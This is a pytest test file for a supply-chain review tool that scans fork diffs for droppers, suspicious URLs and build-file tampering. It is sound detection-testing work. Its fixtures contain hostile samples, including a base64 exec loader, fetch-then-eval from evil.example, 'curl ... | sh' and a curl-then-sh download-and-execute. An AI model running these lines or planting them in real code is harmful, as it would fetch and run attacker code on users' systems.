"""Failing-first regressions from the v5 audit and surviving mutations."""

import json

import pytest

from review import apply as review_apply, diff, localdiff, review
from review.scanners import common, osv as osv_scan, plain, semgrep as semgrep_gate


def test_nosemgrep_is_disabled(tmp_path, monkeypatch):
    source = tmp_path / "a.c"
    source.write_text('void f(){ system("sh /tmp/x"); } // nosemgrep\n')
    seen = {}
    def fake(command, **k):
        seen["cmd"] = command
        return common.ToolResult(0, '{"results":[]}', "")
    monkeypatch.setattr(semgrep_gate, "run_tool", fake)
    semgrep_gate.scan([source], tmp_path, {"a.c": {1}})
    assert "--disable-nosem" in seen["cmd"]
    assert "nosemgrep" in source.read_text()


def test_url_less_droppers_are_found(tmp_path):
    files = {
        "src/boot.py": 'import base64, ctypes\nexec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="))\nctypes.CDLL("/tmp/stage2.so")\n',
        "src/hook.cpp": 'void*h=dlmopen(2,"/tmp/stage2.so",2); void(*p)()=(void(*)())dlsym(h,"run"); p();\n',
        "src/boot.js": 'const { execSync } = require("node:child_process");\nfetch("https://evil.example/x").then(r => r.text()).then(t => eval(t));\n',
        "src/alias.c": '#define RUN system\nvoid f(){ RUN("id"); }\n',
    }
    paths = []
    for relative, text in files.items():
        path = tmp_path / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        paths.append(path)
    added = {name: set(range(1, len(text.split("\n")) + 1)) for name, text in files.items()}
    findings, _ = semgrep_gate.scan(paths, tmp_path, added)
    rules = {row["rule"] for row in findings}
    assert "kalsa.python-decode-exec" in rules
    assert "kalsa.cpp-dynamic-loader" in rules
    assert "kalsa.javascript-process" in rules
    assert "kalsa.macro-alias" in rules


def test_skipped_target_is_a_scanner_error(tmp_path, monkeypatch):
    source = tmp_path / "a.py"
    source.write_text("print(1)\n")
    payload = {"results": [], "errors": [], "paths": {"skipped": ["a.py"]}}
    monkeypatch.setattr(semgrep_gate, "run_tool", lambda *a, **k: common.ToolResult(0, json.dumps(payload), ""))
    findings, _ = semgrep_gate.scan([source], tmp_path, {"a.py": {1}})
    assert findings[0]["rule"] == "scanner-error"


def test_deleted_guard_line_is_reviewed(tmp_path, monkeypatch):
    source = tmp_path / "src/a.c"
    source.parent.mkdir()
    source.write_text("return system(what);\n")
    payload = {"results": [{
        "check_id": "kalsa.cpp-process-exec", "path": "src/a.c",
        "start": {"line": 1}, "end": {"line": 1}, "extra": {},
    }]}
    monkeypatch.setattr(semgrep_gate, "run_tool", lambda *a, **k: common.ToolResult(0, json.dumps(payload), ""))
    findings, _ = semgrep_gate.scan([source], tmp_path, {"src/a.c": set()})
    assert findings == []


def test_docs_build_files_are_code():
    for path in ("docs/CMakeLists.txt", "docs/x.cmake", "docs/install.sh", "docs/Makefile", "docs/boot.py"):
        assert not plain.is_docs(path)
        assert plain.reaches_users(path)


def test_quoted_patch_paths_parse():
    text = 'diff --git "a/m\\303\\266dule.c" "b/m\\303\\266dule.c"\n@@ -0,0 +1 @@\n+int x;\n'
    patches, added, blocks, removed, oversize = localdiff.parse_patches(text)
    assert "mödule.c" in patches and 1 in added["mödule.c"]


def test_two_step_download_execute_is_a_finding(tmp_path):
    path = tmp_path / "CMakeLists.txt"
    path.write_text("curl -s -o /tmp/kp https://github.com/ggml-org/llama.cpp/x\nsh /tmp/kp\n")
    patch = "@@ -0,0 +1,2 @@\n+curl -s -o /tmp/kp https://github.com/ggml-org/llama.cpp/x\n+sh /tmp/kp\n"
    findings, _, _ = plain.scan([path], [("CMakeLists.txt", patch)], tmp_path, "attacker/fork", "ggml-org/llama.cpp")
    assert any(row["rule"] == "download-and-execute" for row in findings)


def test_valid_repo_is_not_a_tautology():
    assert not localdiff.valid_repo("https://github.com/other/repo.git", "wanted/repo")


def test_cargo_lock_changes_keep_crate_names():
    changed = review.changed_dependencies(
        "Cargo.lock", 'name = "foo"\nversion = "1.1.0"\n', 'name = "foo"\nversion = "1.0.0"\n'
    )
    assert changed == {"foo"}


def test_git_env_is_closed_and_protocol_locked():
    env = localdiff.git_env(__import__("pathlib").Path("/tmp/home"))
    assert set(env) == {"PATH", "LANG", "HOME", "GIT_CONFIG_NOSYSTEM", "GIT_CONFIG_GLOBAL", "GIT_TERMINAL_PROMPT", "LC_ALL"}
    assert "protocol.allow=never" in localdiff.GIT_ARGS
    assert "protocol.https.allow=always" in localdiff.GIT_ARGS


def test_release_workflow_heuristic_is_not_always_true():
    result = plain.classify_url(
        {"url": "https://evil.example/x", "file": ".github/workflows/test.yml", "line": 1, "comment": False, "text": "curl https://evil.example/x | sh"},
        "owner/fork", "upstream/repo", release_workflow_flag=False,
    )
    assert result["signal"]


def test_osv_normalise_is_used():
    assert osv_scan.normalise("Foo_Bar") == "foo-bar"


def test_empty_added_file_is_not_unreviewable():
    gate = review.incomplete_diff(
        {"files": [{"filename": "src/empty.py", "status": "A"}]},
        300, (), lambda path: b"",
    )
    assert gate == {}


def test_apply_current_head_mismatch_is_refused(tmp_path, monkeypatch):
    catalog = tmp_path / "engines.toml"
    catalog.write_text(
        '[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\n'
        'repo = "owner/fork"\ncommit = "' + "a" * 40 + '"\n'
    )
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    for sha in ("a" * 40, "b" * 40):
        (reviews / f"one-{sha}.json").write_text(json.dumps({
            "verdict": "no findings", "created_at": "2026-01-01T00:00:00Z",
            "inputs": {"commit": sha, "upstream": "up/repo"},
        }))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": "b" * 40)
    with pytest.raises(ValueError):
        review_apply.apply_review("one", catalog)


def test_apply_rejects_short_report_stem(tmp_path, monkeypatch):
    catalog = tmp_path / "engines.toml"
    catalog.write_text('[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "owner/fork"\n')
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    sha = "a" * 40
    (reviews / f"one-{sha[:7]}.json").write_text(json.dumps({"verdict": "no findings"}))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    with pytest.raises(ValueError):
        review_apply.apply_review("one", catalog)


def test_digest_binds_commit_upstream_and_verdict(tmp_path):
    base = {
        "verdict": "no findings",
        "inputs": {"fork": "owner/fork", "commit": "a" * 40, "upstream": "up/repo", "upstream_sha": "c" * 40, "base_sha": "d" * 40},
        "findings": [],
    }
    digest = review_apply.findings_digest(base)
    changed = json.loads(json.dumps(base))
    changed["inputs"]["commit"] = "b" * 40
    assert review_apply.findings_digest(changed) != digest
    changed = json.loads(json.dumps(base))
    changed["inputs"]["upstream"] = "evil/repo"
    assert review_apply.findings_digest(changed) != digest
    changed = json.loads(json.dumps(base))
    changed["verdict"] = "findings: human review needed"
    assert review_apply.findings_digest(changed) != digest


def test_history_block_guard_not_defeated_by_substring(tmp_path, monkeypatch):
    import shutil
    import subprocess
    from review import catalog, github, localdiff, review as review_module

    base_line = "execute_process(COMMAND echo hi)\n"
    payload = "execute_process(\n  COMMAND echo hi\n)\n"
    work = tmp_path / "work"
    work.mkdir()
    subprocess.run(["git", "init", "-b", "main", str(work)], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(work), "config", "user.email", "t@example"], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(work), "config", "user.name", "T"], check=True, capture_output=True)
    (work / "CMakeLists.txt").write_text("cmake_minimum_required(VERSION 3.20)\n" + base_line)
    subprocess.run(["git", "-C", str(work), "add", "."], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(work), "commit", "-m", "base"], check=True, capture_output=True)
    base = subprocess.check_output(["git", "-C", str(work), "rev-parse", "HEAD"]).decode().strip()
    subprocess.run(["git", "-C", str(work), "checkout", "-b", "fork"], check=True, capture_output=True)
    (work / "CMakeLists.txt").write_text("cmake_minimum_required(VERSION 3.20)\n" + base_line + payload)
    subprocess.run(["git", "-C", str(work), "add", "."], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(work), "commit", "-m", "fork"], check=True, capture_output=True)
    fork = subprocess.check_output(["git", "-C", str(work), "rev-parse", "HEAD"]).decode().strip()
    subprocess.run(["git", "-C", str(work), "checkout", "main"], check=True, capture_output=True)
    upstream = base
    bare = tmp_path / "repo.git"
    subprocess.run(["git", "clone", "--bare", str(work), str(bare)], check=True, capture_output=True)
    engine = {"id": "synthetic", "repo": "owner/fork", "upstream": "owner/up", "kind": "fork"}
    monkeypatch.setattr(catalog, "load", lambda: {"engine": [engine]})
    monkeypatch.setattr(github, "token", lambda: "t")
    monkeypatch.setattr(github, "fork_head", lambda repo, token: (fork, "fork") if repo == "owner/fork" else (upstream, "main"))
    monkeypatch.setattr(github, "default_branch", lambda repo, token: "main")
    monkeypatch.setattr(localdiff, "init", lambda target: shutil.copytree(bare, target, dirs_exist_ok=True))
    monkeypatch.setattr(localdiff, "find_base", lambda *args: base)
    monkeypatch.setattr(localdiff, "domains", lambda *args: set())
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    monkeypatch.setattr(review_module, "REVIEWS", reviews)
    review_module.scan("synthetic", 2000, 200000)
    data = json.loads((reviews / f"synthetic-{fork}.json").read_text())
    assert data["findings"]
    assert not any(row.get("suppressed_because") == "present-in-upstream-history" for row in data["signals"])




def test_package_json_changes_keep_dep_names():
    changed = review.changed_dependencies(
        "package.json", '{"dependencies":{"axios":"^1.7.0"}}', '{"dependencies":{"axios":"^1.6.0"}}'
    )
    assert changed == {"axios"}


def test_fetch_commit_checks_the_catalog_repo():
    assert not localdiff.fetch_commit(None, "https://github.com/other/repo.git", "a" * 40, {}, 64, "wanted/repo")


def test_scrub_removes_only_exact_home_and_temp_prefixes(tmp_path, monkeypatch):
    from review import review as review_module

    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path / "home")
    value = {"x": f"{(tmp_path / 'home')}/a", "keep": "runner/root", "tmp": f"{__import__('tempfile').gettempdir()}/scan/a"}
    cleaned = review_module.scrub(value)
    assert cleaned["x"] == "/a"
    assert cleaned["keep"] == "runner/root"
    assert cleaned["tmp"] == "/scan/a"


def test_non_pinned_fork_owner_url_is_a_finding(tmp_path):
    url = "https://raw.githubusercontent.com/attacker/llama.cpp/main/x.sh"
    path = tmp_path / "CMakeLists.txt"
    path.write_text(f'file(DOWNLOAD "{url}" x)\n')
    patch = f'@@ -0,0 +1 @@\n+file(DOWNLOAD "{url}" x)\n'
    findings, _, _ = plain.scan([path], [("CMakeLists.txt", patch)], tmp_path, "attacker/llama.cpp", "ggml-org/llama.cpp", "attacker/llama.cpp", "a" * 40)
    assert any(row["rule"] == "new-url" for row in findings)


def test_non_release_workflow_stays_a_signal_through_scan(tmp_path):
    path = tmp_path / ".github/workflows/test.yml"
    path.parent.mkdir(parents=True)
    url = "https://evil.example/x"
    text = f"curl {url} | sh\n"
    path.write_text(text)
    patch = f"@@ -0,0 +1 @@\n+{text}"
    findings, signals, _ = plain.scan([path], [(".github/workflows/test.yml", patch)], tmp_path, "owner/fork", "upstream/repo")
    assert not findings and signals


def test_history_proof_requires_the_whole_block(tmp_path, monkeypatch):
    monkeypatch.setattr(localdiff, "file_text", lambda bare, sha, path, env: "one\ntwo\nexecute_process(COMMAND echo hi)\nfour\n")
    checker = localdiff.HistoryChecker(None, "base", "tip", {}, 10)
    assert checker.lookup("CMakeLists.txt", ("execute_process(", "COMMAND echo hi", ")")) is None


def test_report_for_requires_a_full_sha_file(tmp_path, monkeypatch):
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    (reviews / "one-aaaaaaa.json").write_text(json.dumps({"inputs": {"commit": "a" * 40}}))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    with pytest.raises(ValueError):
        review_apply.report_for("one", "a" * 40)


def test_history_filter_requires_the_whole_added_block(tmp_path, monkeypatch):
    findings = [{"tool": "semgrep", "file": "a.c", "line": 1, "rule": "kalsa.cpp-process-exec", "snippet": "system("}]
    blocks = {"a.c": [[1, 2, 3]]}
    lines = {"a.c": ["system(", "arg", ")"]}
    monkeypatch.setattr(localdiff, "file_text", lambda *a: "one\ntwo\nsystem(\nother\nfive\n")
    checker = localdiff.HistoryChecker(None, "base", "tip", {}, 10)
    kept, signals = review.history_filter(findings, checker, blocks, lines)
    assert kept and not signals


def test_human_approval_accepts_scanner_verdict(tmp_path, monkeypatch):
    catalog = tmp_path / "engines.toml"
    catalog.write_text('[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "owner/fork"\n')
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    sha = "a" * 40
    report = {
        "verdict": "findings: human review needed",
        "created_at": "2026-01-01T00:00:00Z",
        "inputs": {"commit": sha, "upstream": "up/repo", "fork": "owner/fork", "upstream_sha": "c" * 40, "base_sha": "d" * 40},
        "findings": [{"file": "a.txt", "line": 1, "rule": "r", "snippet": "x"}],
    }
    report["findings_digest"] = review_apply.findings_digest(report)
    (reviews / f"one-{sha}.json").write_text(json.dumps(report))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    patch = review_apply.apply_review("one", catalog, human_approved=review_apply.findings_digest(report))
    assert "approved after human review" in patch


def test_case_collision_is_unreviewable():
    gate = review.incomplete_diff(
        {"files": [{"filename": "src/a.py", "status": "A", "patch": "@@ -0,0 +1 @@\n+x\n"}, {"filename": "src/A.py", "status": "A", "patch": "@@ -0,0 +1 @@\n+y\n"}]},
        300, ("src/a.py", "src/A.py"),
    )
    assert gate["reason"] == "unreviewable-paths"


def test_binary_patch_urls_are_not_classified(tmp_path):
    path = tmp_path / "logo.png"
    data = b"\x89PNG\r\n\x1a\n\x00https://evil.example/x\x00"
    path.write_bytes(data)
    patch = "@@ -0,0 +1 @@\n+https://evil.example/x\n"
    findings, _, _ = plain.scan([path], [("logo.png", patch)], tmp_path, "owner/fork", "upstream/repo")
    assert not any(row["rule"] == "new-url" for row in findings)


def test_report_records_rule_sources():
    engine = {"id": "one", "repo": "owner/fork", "upstream": "up/repo"}
    report = review.base_report(engine, "one", "a" * 40, "main", "fork", "c" * 40, "d" * 40)
    sources = report["inputs"]["rule_sources"]
    assert sources["semgrep_configs"] == ["p/secrets", "p/supply-chain", "rules.yml"]
    assert len(sources["rules_sha256"]) == 64
